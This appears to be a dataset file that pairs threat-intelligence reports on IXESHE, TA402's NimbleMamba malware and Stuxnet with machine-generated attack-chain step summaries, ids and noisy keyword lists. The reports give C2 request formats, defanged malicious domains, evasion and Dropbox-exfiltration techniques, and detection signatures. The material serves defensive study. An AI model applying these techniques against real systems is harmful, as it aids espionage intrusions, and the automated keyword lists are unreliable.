espionage.IXESHE• First	SeenIndividual targeted attacks are not one-off attempts. Attackers continually try to get inside the target’s network.The IXESHE campaign has been actively staging targeted attacks since at least July of 2009.• Victims	and	TargetsAPT campaigns target specific industries or communities of interest in specific regions.IXESHE has been found to target electronics manufacturers, a telecommunications company, and East Asian governments.• OperationsFirst-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.IXESHE attacks used custom-fit targeted emails with PDF exploits for CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, and CVE-2011-0611. These were used to drop malicious executable files that gave the attackers complete control of their targets’ systems.The attackers used either dynamic Domain Name System (DNS) or compromised servers hosted on networks that they previously successfully infiltrated.• Possible	Indicators	of	CompromiseAttackers want to remain undetected as long as possible. A key characteristic of these attacks is stealth.» Enters networks via a specially crafted, targeted email with a malicious file attachment» Uses document exploits (primarily PDF exploits) to drop malware onto target systems» Uses malware detected as IXESHE by security companies» Sends a GET request to the command-and-control (C&C) server with the format:url Server]/[ACD] [EW]S[Some Numbers].jsp?[Encrypted Base64 Blob]* The campaign codes we have seen so far are detailed in the Trend Micro research paper, “IXESHE: An APT Campaign.” The characteristicshighlighted in this APT campaign quick profile reflect the results of our investigation as of May 2012.May 2012 | APT Campaign Quick Profile: IXESHEAdvanced persistent threats (APTs) refer to a category of threats that aggressively pursue and compromise specific targets to maintain persistent presence within the victim’s network so they can move laterally and exfiltrate data. Unlike indiscriminate cybercrime attacks, spam, web threats, and the like, APTs are much harder to detect because of the targeted nature of related components and techniques. Also, while cybercrime focuses on stealing credit card and banking information to gain profit, APTs are better thought of as cyber espionage.IXESHE• First	SeenIndividual targeted attacks are not one-off attempts. Attackers continually try to get inside the target’s network.The IXESHE campaign has been actively staging targeted attacks since at least July of 2009.• Victims	and	TargetsAPT campaigns target specific industries or communities of interest in specific regions.IXESHE has been found to target electronics manufacturers, a German telecommunications company, and East Asian governments.• OperationsFirst-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.IXESHE attacks used custom-fit targeted emails with PDF exploits for CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, and CVE-2011-0611. These were used to drop malicious executable files that gave the attackers complete control of their targets’ systems.The attackers used either dynamic Domain Name System (DNS) or compromised servers hosted on networks that they previously successfully infiltrated.• Possible	Indicators	of	CompromiseAttackers want to remain undetected as long as possible. A key characteristic of these attacks is stealth.» Enters networks via a specially crafted, targeted email with a malicious file attachment» Uses document exploits (primarily PDF exploits) to drop malware onto target systems» Uses malware detected as IXESHE by security companies» Sends a GET request to the command-and-control (C&C) server with the format:url Server]/[ACD] [EW]S[Some Numbers].jsp?[Encrypted Base64 Blob]* The campaign codes we have seen so far are detailed in the Trend Micro research paper, “IXESHE: An APT Campaign.” The characteristicshighlighted in this APT campaign quick profile reflect the results of our investigation as of May 2012.TREND	MICRO™Trend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud security leader, creates a world safe for exchanging digital information with its In- ternet content security and threat management solutions for businesses and consumers. A pioneer in server security with over 20 years’ experience, we deliver top-ranked client, server and cloud- based security that fits our customers’ and partners’ needs, stops new threats faster, and protects data in physical, virtualized and cloud environments. Powered by the industry-leading Trend Micro™ Smart Pro- tection Network™ cloud computing security infrastructure, our products and services stop threats where they emerge—from the Internet. They are supported by 1,000+ threat intelligence experts around the globe.TREND	MICRO	INC.10101	N.	De	Anza	Blvd. Cupertino,	CA	95014U.S.	toll	free: 1 +800.228.5651 Phone: 1 +408.257.1500 Fax: 1 +408.257.2003 www.trendmicro.com©2012 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend Micro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated. All other product or company names may be trademarks or registered trademarks of their owners.PAGE 19 | iXESHE ",1. The attacker sends a spearphishing email with a malicious PDF attachment to the target. 2. The PDF exploit triggers a vulnerability like CVE-2009-4324 when opened by the target. 3. The exploit drops malware onto the target system that provides remote access. 4. The malware connects to a command and control (C&C) server controlled by the attacker. 5. The C&C server sends commands to control the target system and steal data. 6. The attacker leverages access to move laterally in the network and compromise additional systems. 7. The attacker obscures their activities using compromised servers and proxy tools. 8. The attacker pursues long-term persistent access to the target network. ,valid_98,"['the attacker', 'us', 'PDF', 'attachment', 'the target', 'CVE-2009-4324', 'access', 'the malware', 'control', '(C&C', 'the C&C server', 'commands', 'data', 'the network', 'addition', 'their activities', 'compromised servers', 'Proxy']",the attacker; us; PDF; attachment; the target; CVE-2009-4324; access; the malware; control; (C&C; the C&C server; commands; data; the network; addition; their activities; compromised servers; Proxy.
"www.proofpoint.com /us/blog/threat-insight/ugg-boots-4-sale-tale-palestinian-aligned-espionage Ugg Boots 4 Sale: A Tale of Palestinian-Aligned Espionage | Proofpoint US February 08, 2022 Konstantin Klinger, Joshua Miller, and Georgi Mladenov ⋮ ⋮ 2/2/2022Key TakeawaysTA402, a likely Palestinian-aligned advance persistent threat actor, has recently engaged in campaigns leveraging a new implant, dubbed by Proofpoint analysts as NimbleMamba. NimbleMamba is likely a replacement for the group’s previously used LastConn implant. These campaigns have a complex attack chain that leverages geofencing and URL redirects to legitimate sites in order to bypass detection efforts.OverviewIn late 2021, Proofpoint analysts identified a complex attack chain targeting Middle Eastern governments, foreign policy think tanks, and a state-affiliated airline. Over three months, Proofpoint observed three subtle variations of this attack chain. Proofpoint attributes these campaigns to TA402, an actor commonly tracked as Molerats and believed to be operating in the interest of the Palestinian Territories. Based on Proofpoint’s research, TA402 is a persistent threat to organizations and governments in the Middle East, routinely updating not only their malware implants, but also their delivery methods. After publication of Proofpoint’s TA402 research in June 2021, TA402 appeared to halt its activities for a short period of time, almost certainly to retool. Proofpoint researchers believe they used that time to update their implants and delivery mechanisms, using malware dubbed NimbleMamba and BrittleBush. TA402 also regularly uses geofencing techniques and varied attack chains which complicate detection efforts for defenders.Campaign DetailsFigure 1. TA402 attack chain November 2021 to January 2022.In the recently observed campaigns, TA402 used spear phishing emails containing links that often lead to malicious files. Proofpoint observed three different URL types in those campaigns.1/11Variation 1: Actor-Controlled Domain (November 2021)In a November 2021 campaign, TA402 masqueraded as the Quora website while using an actor-controlled Gmail account with an actor-controlled domain. The malicious URL, such as https[:]//www[.]uggboots4sale[.]com/news15112021.php, in the phishing email was geofenced to the targeted countries. If the target's IP address fits into the targeted region, the user would be redirected to the RAR file download containing the latest TA402 implant, NimbleMamba. If outside the target area, the user would be redirected to a legitimate news site, Figure 2.Figure 2. Benign redirect to legitimate news site https[:]www[.]emaratalyoum[.]com.Variation 2: Dropbox URL (December 2021)In December 2021, TA402 used multiple phishing pretenses, including clickbait medical lures and ones allegedly sharing confidential geopolitical information. TA402 continued to use an actor-controlled Gmail account but shifted to Dropbox URLs to deliver the malicious RAR files containing NimbleMamba. This shift away from actor-controlled domains meant that TA402 could no longer geofence their payloads. Proofpoint discovered that TA402 is not only abusing Dropbox services for delivery of NimbleMamba, but also for malware command and control (C2). Proofpoint has shared our investigation and analysis with Dropbox prior to publication, and they took the needed actions for neutralizing the activity within their organization.Variation 3: WordPress Redirect Actor-Controlled Domain (December 2021/January 2022)In their latest campaigns, TA402 continued to use lure content customized for each of their targets but slightly adjusted their attack chain by inserting an additional actor-controlled WordPress URL. That WordPress site (Figure 3), which impersonates a news aggregator of the legitimate news site from Variation 1, likely redirects to the download site of the malicious RAR files containing NimbleMamba if the visitor is coming from an IP within the targeted region. If the source IP address does not align with the target region, the URL will redirect the recipient to a benign website, typically an Arabic language news website (Figure 2).2/11Figure 3. Example WordPress site (https[:]//emaratalyoumcom[.]wordpress[.]com/) impersonating an Arabic language news aggregator.The use of geofenced URLs, Dropbox URLs and then redirect URLs demonstrate TA402’s determination to blend in with legitimate email traffic and infect targets with NimbleMamba.Malware Analysis: NimbleMambaEach variant of TA402’s attack chain led to a RAR file containing one or multiple malicious compressed executables. These executables include a TA402 implant Proofpoint dubbed NimbleMamba and oftentimes an additional trojan Proofpoint named BrittleBush. NimbleMamba is almost certainly meant to replace LastConn, which Proofpoint reported about in June 2021. LastConn was likely an updated version of the SharpStage malware, reported by Cybereason in December 2020. While NimbleMamba and LastConn have some similarities, such as being written in C#, base64 encoding within the C2 framework, and use of the Dropbox API for C2 communication, there appears to be little code overlap between the two.NimbleMamba uses guardrails to ensure that all infected victims are within TA402’s target region. NimbleMamba uses the Dropbox API for both command and control as well as exfiltration. The malware also contains multiple capabilities designed to complicate both automated and manual analysis. Based on this, Proofpoint assesses NimbleMamba is actively being developed, is well-maintained, and designed for use in highly targeted intelligence collection campaigns.For this malware analysis, Proofpoint researchers analyzed the following two samples:SHA256 Used in an email-3/11Sample 23:13:2900:02:28 basedcampaign 2022NimbleMamba is written in C# and delivered as an obfuscated .NET executable using third-party obfuscators. Both samples analyzed used the SmartAssembly obfuscator. Additionally, the malware does basic virtual machine checks to avoid detection by looking for common strings that indicate a sample is running in a virtual environment.GuardrailsNimbleMamba contains multiple guardrails to ensure that the malware only executes on targeted machines. It uses the following IP resolving web services to check the user’s IP address and determine if it fits into the target region. This is done to avoid detection and analysis.api[.]ipify[.]com (url myexternalip[.]com (url ip-api[.]com (url api[.]ipstack[.]com (url the machine is unable to connect to those services, the malware will keep calling the addresses in random order, thus putting the execution in an endless loop in closed network environments.The malware will only continue executing if the country of the resolved IP address country code matches one from the following table or if the host computer has an Arabic language pack (code “AR”) installed.Code Country United Arab Emirates SSD Soud Sudan (Alpha-3 code, probably added by accident)Palestine South Sudan4/11Iraq BHConfigurationNimbleMamba’s configuration is retrieved from a paste on the website JustPasteIt. NimbleMamba takes the current timestamp from an online real-time service to ensure that the timestamp matches the current time. Some computers may have modified time settings and this method ensures that the time is standardized across infections. The obtained timestamp is then used to generate a JustPasteIt URL with the algorithm in Figure 4.Figure 4. Python implementation of NimbleMamba’s JustPasteIt algorithm.When there is an active paste under the generated URL, it should look like this:5/11Figure 5. Example of JustePasteIt paste content.The data taken from the paste service is split by “#” and then each split by “=” to form the following two key-value OOOO 40,1ckZnB3a45mMpRTTYplNiNmZACSS contains the obfuscated Dropbox account API auth key that is used for C2 communication. The malware then takes the external IP address, username and computer name retrieved earlier, writes them as comma-separated strings, base64 encodes them with stripped padding bytes and then reverses the string. The resulting string is used as a folder name that is created on the Dropbox account using their API with the API key deobfuscated (Figure 6) from the JustPasteIt post.6/11Figure 6. Dropbox API key deobfuscation.From there, the malware starts communicating with Dropbox to obtain a RAR file and a decoy file that is immediately displayed to the user if present. The decoy file is often an office document or PDF. The RAR file is password- protected with a password stored as the second comma-separated value in the OOOO argument from the JustPasteIt paste and dropped to the folder pointed by the first parameter in OOOO. The downloaded RAR file contains two additional executables, an updated sample of NimbleMamba along with an executable that contains a screenshot of the functionality. This technique allows for TA402 to serve additional payloads to targeted NimbleMamba victims.Pivoting on the JustPasteIt user “Nefaty Benet” [Researcher Note: This account is likely meant to impersonate the Israeli Prime Minister Naftali Bennett) allows us to see that the NimbleMamba campaign likely started in August 2021, two months after Proofpoint’s previous research. This timeframe is consistent with the compile dates of the NimbleMamba samples identified in VirusTotal.7/11Figure 7. Pivot to all pastes created by user “Nefaty Benet.”FunctionalityNimbleMamba has the traditional capabilities of an intelligence-gathering trojan and is likely designed to be the initial access. Functionalities include capturing screenshots and obtaining process information from the computer. Additionally, it can detect user interaction, such as looking for mouse movement.BrittleBush TrojanLater versions of the RAR files that deliver NimbleMamba also included a small trojan application Proofpoint dubbed BrittleBush (2E4671C517040CBD66A1BE0F04FB8F2AF7064FEF2B5EE5E33D1F9D347E4C419F). This trojan communicated with easyuploadservice[.]com and received commands as base64 encoded JSON structure.Figure 8. BrittleBush JSON structure.8/11AttributionProofpoint attributes the campaigns to TA402 based on both technical indicators and victimology. The observed attack chains mimic historical TA402 campaigns, some of which are discussed in Proofpoint’s June 2021 research. The phishing campaigns share thematic elements with historical Molerats campaigns. For example, the December 2021 campaign contained a title bearing significant similarities to a 2015 TA402 campaign reported by Kaspersky.Campaign “ﺔﺤﻠﺴﻤﻟا تاﻮﻘﻠﻟ مﺎﻌﻟا ﺪﺋﺎﻘﻟا ﻦﯿﺑ ﺔﺑﺮﺴﻣ ﺔﻤﻟﺎﻜﻣ ﻲﺤﺒﺻ ﻲﻗﺪﺻ ﺔﯾﺮﺼﻤﻟا.exe” ﺮﻄﻗ ﻲﻓ نﺎﻏودراو نﺎﻤﻠﺳ ﻦﺑ ﻦﯿﺑ يﺮﺳ ءﺎﻘﻟTranslation Leaked conversation with the Egyptian leader of military forces Sodqi Sobhi[.]exe Secret meeting between bin Salman and Erdogan in QatarThe campaigns observed by Proofpoint likely occurred concurrently to Zscaler’s recently published research on Molerats activity targeting individuals in Palestine & Turkey and demonstrate Molerats continued ability to modify their attack chain based on their intelligence targets.The significant technical connections between the DropBox accounts used by the LastConn malware, the account used to deploy NimbleMamba, and the account used to store intelligence exfiltrated by NimbleMamba indicate that LastConn and NimbleMamba are almost certainly deployed by the same operators. This was based on the findings found during the investigation performed by Dropbox Security Team, which neutralized all the associated accounts.Technical intelligence, including analysis of Molerats network activity from TeamCymru, indicates NimbleMamba developers operate in the interest of the Palestinian Territories. The guardrails employed by NimbleMamba demonstrate a clear focus on targeting Arabic speakers along with computers in the Middle East. Proofpoint observed campaigns targeting Middle Eastern governments, foreign policy think tanks, and a state-affiliated airline. Proofpoint assesses TA402 likely operates in support of Palestinian objectives, which is consistent with prior Proofpoint and the broader industry’s previously published assessments.ConclusionTA402 continues to be an effective threat actor that demonstrates its persistence with its highly targeted campaigns focused on the Middle East. Based on the variations between campaigns delivering NimbleMamba, along with the historical pattern of developing new malware post disclosure, Proofpoint judges with moderate confidence that TA402 will continue to update both their implants and infection chains to complicate defensive efforts.Indicators of Compromise (IOCs)IOCIOC NimbleMamba Sample 1 (Dec 2021 / Jan 2022) NimbleMamba Sample 2 (Nov domain used for with retro hunt (Oct 2021)9/11easyuploadservice[.]com SHA256 BrittleBushSampleET Signatures2035112 TA402/Molerats CnC Checkin2035113 TA402/Molerats Payload Downloaded2035120 TA402/Molerats CnC Activity2035121 TA402/Molerats External IP Lookup Activity2035122 TA402/Molerats Related Malware Domain in DNS Lookup2035123 TA402/Molerats Related Malware Domain in DNS LookupYARA Signaturesrule Proofpoint_Molerats_TA402_NimbleMamba {meta:description = ""Detects .NET written NimbleMamba malware used by TA402/Molereats""author = ""Proofpoint Threat Research""disclaimer = ""Yara signature created for hunting purposes - not quality controlled within enterprise ","1. TA402 sends spear phishing emails containing links to targets in the Middle East region. 2. The phishing links use geofencing and redirects to evade detection. 3. If the target's IP is in the Middle East, they are redirected to an actor-controlled domain or Dropbox URL to download a RAR file. 4. The RAR file contains the NimbleMamba malware and sometimes the BrittleBush trojan. 5. NimbleMamba executes on the victim's system and communicates with attacker-controlled Dropbox accounts for command and control. 6. NimbleMamba exfiltrates data like screenshots and system info back to the attacker via the Dropbox API. 7. The BrittleBush trojan receives commands from a C2 server and may provide additional capabilities. 8. TA402 continuously updates their malware, infrastructure, and attack tactics to evade detection. ",valid_92,"['TA402', 'spear', 'emails', 'links', 'targets', 'the Middle East', 'use', 'geofencing', 'redirects', 'detection', 'ip', 'an actor-controlled domain', 'Dropbox URL', 'a RAR file', 'The RAR file', 'NimbleMamba malware', 'time', 'BrittleBush', 'screenshots', 'the Dropbox API', 'commands', 'their malware']",TA402; spear; emails; links; targets; the Middle East; use; geofencing; redirects; detection; ip; an actor-controlled domain; Dropbox URL; a RAR file; The RAR file; NimbleMamba malware; time; BrittleBush; screenshots; the Dropbox API; commands; their malware.
"The Stuxnet Computer Worm: Harbinger of an Emerging Warfare CapabilityPaul K. Kerr Analyst in NonproliferationJohn Rollins Specialist in Terrorism and National SecurityCatherine A. Theohary Analyst in National Security Policy and Information OperationsDecember 9, 2010CRS Report for Congress Prepared for Members and Committees of CongressCongressional Research Service 7-5700 www.crs.gov R41524The Stuxnet Computer Worm: Harbinger of an Emerging Warfare CapabilitySummary In September 2010, media reports emerged about a new form of cyber attack that appeared to target Iran, although the actual target, if any, is unknown. Through the use of thumb drives in computers that were not connected to the Internet, a malicious software program known as Stuxnet infected computer systems that were used to control the functioning of a nuclear power plant. Once inside the system, Stuxnet had the ability to degrade or destroy the software on which it operated. Although early reports focused on the impact on facilities in Iran, researchers discovered that the program had spread throughout multiple countries worldwide.From the perspective of many national security and technology observers, the emergence of the Stuxnet worm is the type of risk that threatens to cause harm to many activities deemed critical to the basic functioning of modern society. The Stuxnet worm covertly attempts to identify and exploit equipment that controls a nation’s critical infrastructure. A successful attack by a software application such as the Stuxnet worm could result in manipulation of control system code to the point of inoperability or long-term damage. Should such an incident occur, recovery from the damage to the computer systems programmed to monitor and manage a facility and the physical equipment producing goods or services could be significantly delayed. Depending on the severity of the attack, the interconnected nature of the affected critical infrastructure facilities, and government preparation and response plans, entities and individuals relying on these facilities could be without life sustaining or comforting services for a long period of time. The resulting damage to the nation’s critical infrastructure could threaten many aspects of life, including the government’s ability to safeguard national security interests.Iranian officials have claimed that Stuxnet caused only minor damage to its nuclear program, yet the potential impact of this type of malicious software could be far-reaching. The discovery of the Stuxnet worm has raised several issues for Congress, including the effect on national security, what the government’s response should be, whether an international treaty to curb the use of malicious software is necessary, and how such a treaty could be implemented. Congress may also consider the government’s role in protecting critical infrastructure and whether new authorities may be required for oversight.This report will be updated as events warrant.Congressional Research ServiceThe Stuxnet Computer Worm: Harbinger of an Emerging Warfare CapabilityContents Introduction: The Stuxnet Computer Worm 1 The Stuxnet Worm: Possible Developers and Future Users 2 Iran: The Intended Target? 3 ICS Vulnerabilities and Critical Infrastructure 6 National Security Implications 7 Issues 8Appendixes Appendix. Glossary 9Contacts Author Contact Information 9Congressional Research ServiceThe Stuxnet Computer Worm: Harbinger of an Emerging Warfare CapabilityIntroduction: The Stuxnet Computer Worm1 Since the invention of the first computer-assisted industrial control system (ICS) device over 40 years ago,2 both the technical and national security communities have voiced concerns about software and hardware vulnerabilities and potential security risks associated with these devices. Such concerns have generally involved the infiltration of a computer system for purposes of degrading its capabilities, manipulating data, or using the device to launch cyber attacks on other systems. The Stuxnet worm,3 which was first reported in June 2010 by a security firm in Belarus, appears to be the first malicious software (malware) designed specifically to attack a particular type of ICS: one that controls nuclear plants, whether for power or uranium enrichment. The malware attacks and disrupts a Microsoft Windows-based application that is employed by a particular ICS produced by the German company Siemens.4 The worm can be spread through an air-gapped network by a removable device, such as a thumb drive, and possibly through computers connected to the Internet, and it is often capable of remaining hidden from detection. It is difficult to determine the geographic origin of the malware, as cyber attackers often employ sophisticated methods such as peer-to-peer networking or spoofing IP addresses to obviate attribution. Likewise, malware placed on a removable device may contain no signatures that would identify its author. Some security analysts speculate that Stuxnet could have been developed by a Siemens insider who had direct access and knowledge of the system; others contend that the code’s sophistication suggests that a nation state was behind the worm’s development, either through proxy computer specialists or a government’s own internal government and military capabilities.5To date, numerous countries are known to have been affected by the Stuxnet worm to varying degrees of disruption in their technology systems. These include Iran, Indonesia, India, Pakistan, Germany, China, and the United States. A lack of publicly available information on the damage caused by Stuxnet in these countries makes it difficult to determine the malware’s potency.1 Information contained in this report is derived from unclassified open source material and discussions with senior government officials and industry technology and security experts. 2 Industrial control systems (ICS) assist in the management of equipment found in critical infrastructure facilities. ICSs include supervisory control and data acquisition (SCADA) systems, distributed control systems (DCS), and Programmable Logic Controllers (PLC). For additional information on ICS see Guide to Industrial Control Systems, National Institute of Standards and Technology, September 2008, url draft_sp800-82-fpd.pdf. 3 A computer worm differs from a virus in that the latter requires user action to set in motion of set of potential harmful activities whereas a worm is self-executable and will burrow its way through an operating system until it reaches its intended target. 4 See ESET Technical Report: Stuxnet Under the Microscope, accessed at url Stuxnet_Under_the_Microscope.pdf. 5 For more information on the technical details of Stuxnet, including its discovery, possible origin, level of sophistication, and breadth, see Nicolas Falliere, Liam O Murchu, and Eric Chien, W32.Stuxnet Dossier, Version 1.1, Symantec, accessed at url w32_stuxnet_dossier.pdf.Congressional Research Service1The Stuxnet Computer Worm: Harbinger of an Emerging Warfare CapabilityThe Stuxnet Worm: Possible Developers and Future Users In attempting to assess the Stuxnet worm’s potential targets and ascertain how best to identify and slow progress of its spread to other ICSs, numerous researchers have speculated as to the identity of the software code’s developer. To date, no country or group has claimed responsibility for developing what has been termed by some as “the world’s first precision guided cybermunition.”6 Given the Stuxnet worm’s reported technical sophistication, numerous researchers and media outlets have speculated that a government most likely produced it. According to these accounts, the developer had to be financially well-resourced, employ a variety of skill sets (including expertise in multiple technology areas), have an existing foreign intelligence capability in order to gain access and knowledge of a foreign system, and be able to discretely test the worm in a laboratory setting. Moreover, states appear to possess a motive to develop Stuxnet because, unlike other forms of malware, the worm is not designed to steal information, but rather to target and disrupt control systems and disable operations.7 Countries thought to have the expertise and motivation of developing the Stuxnet worm include the United States, Israel, United Kingdom, Russia, China, and France.8In addition to speculating on the developer’s identity, observers have formulated theories about the worm’s intended purpose. For example, some argue that Stuxnet’s developer may not have intended the worm to spread beyond its desired target, thus bringing unwarranted attention to this emerging cyber capability.9 Furthermore, it is likely the developer did not consider the unintended consequence of the worm becoming widely available and subject to manipulation to make it less identifiable and more potent.A terrorist organization intent on carrying out attacks on a nation’s critical infrastructure may also be interested in targeting a type of ICS known as supervisory control and data acquisition (SCADA) systems. It is widely believed that terrorist organizations do not currently posses the capability or have made the necessary arrangements with technically savvy organizations to develop a Stuxnet-type worm. However, the level of attention the Stuxnet worm has received creates a possible proliferation problem and what some have termed a “cyber arms race.”10 The Stuxnet code itself is now freely available on the Internet, as are the particular vulnerabilities it exploits, as well as the web addresses of unsecured SCADA systems.11 As software developers 6 Hunting an Industrial-Strength Computer Virus Around the Globe, PBS Newshour, October 1, 2010, url 7 Nicolas Falliere, Liam O Murchu, and Eric Chien, W32.Stuxnet Dossier, Version 1.1, Symantec, accessed at url 8 Theories Mount That Stuxnet Worm Sabotaged Iranian Nuke Facilities, Forbes online, September 22, 2010, url facilities/. 9 Each of the Nations mentioned as a possible developer of the Stuxnet worm have, to varying degrees, had industrial control systems in their country affected. 10 Warwick Ashford, “Stuxnet worm is prototype for cyber-weapon, say security experts,” Computer Weekly, September 24, 2010. 11 SCADA systems can be located via public search engine, says the Industrial Control Systems Cyber Emergency Response Team, InfoSecurity.com, November 3, 2010, url systems-can-be-located-via-public-search-engine-says-cert/.Congressional Research Service2The Stuxnet Computer Worm: Harbinger of an Emerging Warfare Capabilityoften revise and reformulate existing code, Stuxnet’s design revelations may make it easier for terrorist organizations to develop such capabilities in the future. Melissa Hathaway, former Acting Senior Director for Cyberspace for the National Security and Homeland Security Councils, was recently quoted as saying, “Proliferation [of cyber weapons] is a real problem, and no country is prepared to deal with it. All of these [computer security] guys are scared to death. We have about 90 days to fix this [new vulnerability] before some hacker begins using it.”12It is also worth noting that, in the future, a non-state actor may not necessarily need to possess the Stuxnet code in order to use the worm. Cybercrime organizations have been said to “rent” networks of infected computers, known as “botnets,” for use in politically motivated cyber attacks on government websites and computer networks. It may become possible for organizations to develop and either rent or sell malware such as Stuxnet or access to infected computers for malicious use against government or civilian infrastructure. In addressing concerns about threats emanating from cyberspace from a variety of potential actors, Deputy Defense Secretary William J. Lynn III noted, “Once the province of nations, the ability to destroy via cyber means now also rests in the hands of small groups and individuals: from terrorist groups to organized crime, hackers to industrial spies to foreign intelligence services.”13Early reports indicated that the intended target of Stuxnet may have been SCADA-controlled nuclear facilities in Iran that used the Siemens product.14 If a country developed Stuxnet and the target was a single country’s infrastructure, the worm’s spread to multiple countries has implications for the lack of precision targeting of cyber weapons, their unknown secondary and tertiary effects, and for the rules of engagement for responding to a cyber attack.Iran: The Intended Target? Iran has apparently suffered the most attacks by the Stuxnet worm and, as noted, may well have been its main target. A September 2010 study by Symantec argued that the “concentration of infections in Iran likely indicates that this was the initial target for infections and was where infections were initially seeded.”15 As of September 25, 2010, Iran had identified “the IP addresses of 30,000 industrial computer systems” that had been infected by Stuxnet, according to Mahmoud Liaii, director of the Information Technology Council of Iran’s Industries and Mines Ministry, who argued that the virus “is designed to transfer data about production lines from our industrial plants” to locations outside of Iran.16Iranian officials have indicated that the worm infected computers associated with the country’s nuclear power plant under construction near Bushehr. Dr. Mohammad Ahmadian, an Iranian Atomic Energy Organization official, stated in October that the worm may have been transferred12 John Markoff, “A Silent Attack, but Not a Subtle One,” The New York Times, September 26, 2010. 13 Cybersecurity Poses Unprecedented Challenge to National Security, Lynn Says, U.S. Department of Defense, American Forces Press Service, June 15, 2009, url 14 Gregg Keizer, “Iran confirms massive Stuxnet infection of industrial systems,” Computerworld, September 25, 2010. 15 Nicolas Falliere, Liam O Murchu, and Eric Chien, W32.Stuxnet Dossier, Symantec Security Response, September 2010, p. 7. 16 “Iran Confirms Cyber Attack, Says Engineers ‘Rooting Out’ Problem,” Mehr News Agency, September 25, 2010. Ali Akbar Salehi, the head of Iran’s Atomic Energy Organization, stated in an interview published October 8 that the organization “became aware” of the worm as early as July.Congressional Research Service3The Stuxnet Computer Worm: Harbinger of an Emerging Warfare Capabilityto computers at the reactor site via “CDs and Flash memory sticks,” adding that the affected computers have since been “inspected and cleaned up.”17 Some of those responsible for transferring the worm were “foreign experts who had been frequenting industrial centres,” Iran’s minister of communication Reza Taqipur stated in October.18 Iranian officials have indicated that the reactor, which is not yet operational, has not been affected by Stuxnet.19 Olga Tsyleva, press- secretary of the Atomstroyeksport, the Russian contractor for the Bushehr project, confirmed October 5, 2010, that the worm had spread to the Bushehr facility’s computers but had not caused any damage.20In addition to Liaii’s description of Stuxnet’s purpose, reports of the Stuxnet infections in Iran have, as noted, fueled speculation that the virus was part of an effort by some countries, including the United States and Israel, to sabotage Tehran’s nuclear programs. In addition to the Bushehr reactor, Iran has constructed both a pilot and a commercial gas centrifuge-based uranium enrichment facility near Natanz. 21 Tehran continues enrichment operations at the Natanz facilities, according to a November 23, 2010, report by International Atomic Energy Agency Director-General Yukiya Amano.22 Uranium enrichment can produce fuel for nuclear reactors, but can also produce fissile material for use in nuclear weapons.Iran’s uranium enrichment facilities seem to be a more likely target for a cyber attack than does the Bushehr reactor. Mark Fitzpatrick, former acting Deputy Assistant Secretary of State for Non- proliferation, argued in September that such an attack would not make sense because the reactor is not a prime proliferation concern, the Financial Times reported.23 Iranian officials have themselves indicated that the Bushehr reactor may not have been the worm’s only target. For example, an October 5 statement from Iran’s Foreign Ministry spokesman Ramin Mehmanparast appeared to reference Iran’s uranium enrichment program.24 Moreover, Ali Akbar Salehi, the head of Iran’s Atomic Energy Organization, suggested September 29 that “enemies” had attempted to infect nuclear facilities other than Bushehr.25 More recently, some experts have argued that, because Stuxnet was designed to manipulate equipment used in centrifuge facilities, the worm may have been developed to sabotage Iran’s enrichment plant.26 Whether the Natanz facility contains Siemens components that would be affected by the virus is unclear. The presence of such17 “Iran’s Bushehr Nuclear Plant to Come on Stream in Mid April 2011,” Islamic Republic News Agency, October 16, 2010. 18 “Stuxnet Virus Spread Individuals Said Identified by Iran Official,” Islamic Republic of Iran Broadcasting, October 20, 2010. 19 Islamic Republic News Agency, October 16, 2010; “Bushehr Reactor to Get Main Fuel in Second Week of October,” Islamic Republic News Agency, October 5, 2010. 20 “Fuel Lading at Iran’s Bushehr Pant Panned for October - Russian source,” RIA Novosti, October 5, 2010. 21 See CRS Report RL34544, Iran’s Nuclear Program: Status, by Paul K. Kerr. Russia, rather than Iran, is to supply fuel for the Bushehr reactor. 22 Implementation of the NPT Safeguards Agreement and Relevant Provisions of Security Council Resolutions in the Islamic Republic of Iran, Report by the Director General, GOV/2010/62, November 23, 2010. 23 Najmeh Bozorgmehrin, James Blitz, and Daniel Dombey, “Web Virus Aimed at Nuclear Work, Says Tehran,” Financial Times, September 27, 2010. 24 “Iran Official Points to West’s Hand in Computer Worm at Nuclear Plant,” Islamic Republic of Iran News Network, October 5, 2010. 25 “Transmitting Virus to Iran Systems, In Vain- AEOI Chief,” Islamic Republic News Agency, September 29, 2010. 26 David Albright and Andrea Stricker, “Stuxnet Worm Targets Automated Systems for Frequency Converters: Are Iranian Centrifuges the Target?” Institute for Science and International Security, November 17, 2010.Congressional Research Service4The Stuxnet Computer Worm: Harbinger of an Emerging Warfare Capabilitycomponents in the Bushehr reactor appears to be more likely because Siemens originally worked on the project.Stuxnet’s impact on Iran’s nuclear facilities is unclear. Although, as noted, some Iranian officials have stated that the Bushehr reactor was not affected, some accounts suggest that the malicious software may have slowed down or disabled operations at Iran’s enrichment facilities. For example, Iranian President Mahmoud Ahmadinejad said of the cyber attack that unnamed perpetrators “were able to cause minor problems with some of our centrifuges by installing some software in electronic parts. They did wrong. They misbehaved but fortunately, our experts discovered it.”27 Moreover, an unnamed “senior diplomat” suggested that Stuxnet may have caused Iran to shut down its commercial centrifuge facility for a few days in November 2010, Reuters reported November 23.28Iranian officials have attributed the Stuxnet infections to a cyber attack, with some suggesting that Western countries are responsible. For example, Mahmoud Liaii characterized the worm as part of an “electronic war [that] has been launched against Iran.”29 Additionally, Mehmanparast suggested October 5 that the “West” is taking “steps and efforts to use every possible means to prevent the peaceful nuclear activities of our country.”30 An October 20 Open Source Center analysis, however, observed that Iranian officials have “largely remained vague” about Stuxnet’s “target, intent, and origin.”31There have been previous allegations of efforts by the United States and other governments, including Israel, to sabotage Iran’s centrifuge program. The New York Times reported in January 2009 that such efforts have included “undermin[ing] electrical systems, computer systems and other networks on which Iran relies,” according to unnamed senior U.S. and foreign government officials.32 One effort involved foreign intelligence services sabotaging “individual power units that Iran bought in Turkey” for Tehran’s centrifuge program. “A number of centrifuges blew up,” according to the Times.33 Western governments have reportedly made other efforts to sabotage centrifuge components destined for Iran, according to some non-governmental experts.34 Additionally, New York Times reporter James Risen wrote in 2006 that, according to unnamed U.S. officials, the United States engaged in a covert operation to provide Iran with flawed blueprints for a device designed to trigger a nuclear explosion.3527 “Wikileaks Revelations ‘Worthless’, 